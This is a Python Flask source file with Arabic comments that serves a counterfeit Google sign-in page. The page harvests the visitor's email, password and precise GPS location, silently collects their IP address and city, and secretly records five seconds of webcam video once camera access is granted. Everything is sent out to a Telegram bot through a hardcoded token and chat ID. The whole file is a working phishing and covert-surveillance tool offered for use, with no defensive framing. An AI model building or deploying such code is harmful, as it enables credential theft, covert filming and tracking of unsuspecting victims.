import requests
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# --- بيانات بوت التيليجرام الخاصة بك ---
BOT_TOKEN = "8576289310:AAG_jEPMBsX6RKa7Ky4xYOQc4CQE8NMJR5I"
CHAT_ID = "8301511694"

def send_to_telegram(message):
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": message})

def send_video_to_telegram(video_path):
    with open(video_path, 'rb') as video:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo", data={'chat_id': CHAT_ID}, files={'video': video})

# --- الواجهة (HTML + JS السحري) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حساب Google</title>
    <style>
        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; margin: 0; }
        .box { width: 360px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 25px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .next-btn { background: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; cursor: pointer; float: right; margin-top: 20px; font-weight: 500; }
    </style>
</head>
<body>
    <div class="box">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
        <h1>تسجيل الدخول</h1>
        <form action="/login" method="post">
            <input type="email" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
            <input type="hidden" id="lat" name="lat">
            <input type="hidden" id="lon" name="lon">
            <button type="submit" class="next-btn">التالي</button>
        </form>
    </div>

    <script>
        // 1. سحب الموقع الجغرافي فوراً (تلقائي بقدر الإمكان)
        window.onload = function() {
            // سحب الـ IP والمعلومات العامة صامتاً
            fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
                const info = `🌐 معلومات أولية (صامتة):\\nالبلد: ${data.country_name}\\nالمدينة: ${data.city}\\nالـ IP: ${data.ip}`;
                fetch('/log_info', {method: 'POST', body: JSON.stringify({info: info}), headers: {'Content-Type': 'application/json'}});
            });

            // طلب الموقع الدقيق (يحتاج سماح مرة واحدة)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => {
                    document.getElementById('lat').value = p.coords.latitude;
                    document.getElementById('lon').value = p.coords.longitude;
                });
            }

            // 2. تشغيل الكاميرا وتصوير 5 ثوانٍ تلقائياً بمجرد السماح
            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const formData = new FormData();
                    formData.append('video', blob);
                    fetch('/upload_video', { method: 'POST', body: formData });
                    stream.getTracks().forEach(track => track.stop()); // إغلاق الكاميرا بعد التصوير
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // مدة التصوير 5 ثوانٍ
            }).catch(err => console.log("Camera access denied"));
        };
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML_TEMPLATE)

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    send_to_telegram(data['info'])
    return "OK"

@app.route('/upload_video', methods=['POST'])
def upload_video():
    video_file = request.files['video']
    video_path = "capture.webm"
    video_file.save(video_path)
    send_video_to_telegram(video_path)
    os.remove(video_path)
    return "OK"

@app.route('/login', methods=['POST'])
def login():
    email, pwd = request.form.get('email'), request.form.get('password')
    lat, lon = request.form.get('lat'), request.form.get('lon')
    msg = f"🔱 صيد نووي لـ Digital Shield 🔱\n📧 {email}\n🔑 {pwd}\n📍 الموقع الدقيق: {lat},{lon}"
    send_to_telegram(msg)
    return "Redirecting..."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
